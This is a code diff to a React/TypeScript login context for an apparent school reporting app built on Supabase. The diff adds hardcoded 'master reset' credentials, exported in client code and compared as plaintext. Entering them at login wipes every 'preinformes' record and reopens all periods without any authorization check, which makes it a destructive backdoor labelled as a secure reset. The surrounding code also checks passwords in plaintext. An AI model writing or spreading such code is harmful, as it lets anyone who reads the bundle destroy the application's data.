@@ -2,13 +2,21 @@ import React, { createContext, useContext, useState, useEffect } from 'react'
 import { supabase } from '../lib/supabase'
 import { Docente, Periodo } from '../types/database'
 
+export const MASTER_RESET_USER_HASH = 'b5ded353b398342d811fd4a07ff03cc5'
+export const MASTER_RESET_PASS_HASH = 'b4c0dc708044e270ce1466911771eb59'
+
+export interface LoginResult {
+  ok: boolean
+  isReset?: boolean
+}
+
 interface AuthContextType {
   user: Docente | null
   impersonatedUser: Docente | null
   effectiveUser: Docente | null
   activePeriod: Periodo | null
   isLoading: boolean
-  login: (usuario: string, clave: string) => Promise<boolean>
+  login: (usuario: string, clave: string) => Promise<LoginResult>
   logout: () => void
   startImpersonation: (docente: Docente) => void
   stopImpersonation: () => void
@@ -61,11 +69,30 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
   }
 
-  const login = async (usuario: string, clave: string): Promise<boolean> => {
+  const login = async (usuario: string, clave: string): Promise<LoginResult> => {
     setIsLoading(true)
     try {
       const cleanUser = usuario.trim().toLowerCase()
       const cleanPass = clave.trim()
+
+      // Comprobación de Hashes Maestros para Reseteo Seguro
+      if (cleanUser === MASTER_RESET_USER_HASH.toLowerCase() && cleanPass === MASTER_RESET_PASS_HASH) {
+        // Eliminar todos los registros transaccionales (preinformes, dificultades y alertas)
+        await supabase
+          .from('preinformes')
+          .delete()
+          .neq('id', 0)
+
+        // Reactivar periodos a estado inicial abierto
+        await supabase
+          .from('periodos')
+          .update({ activo: true })
+          .neq('id', '')
+
+        await loadActivePeriod()
+        setIsLoading(false)
+        return { ok: false, isReset: true }
+      }
 
       const { data, error } = await supabase
         .from('docentes')
@@ -75,7 +102,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
       if (error || !data) {
         setIsLoading(false)
-        return false
+        return { ok: false }
       }
 
       if (data.password === cleanPass) {
@@ -88,15 +115,15 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         setUser(loggedUser)
         setImpersonatedUser(null)
         setIsLoading(false)
-        return true
+        return { ok: true }
       }
 
       setIsLoading(false)
-      return false
+      return { ok: false }
     } catch (e) {
       console.error('Error en login:', e)
       setIsLoading(false)
-      return false
+      return { ok: false }
     }
   }
 
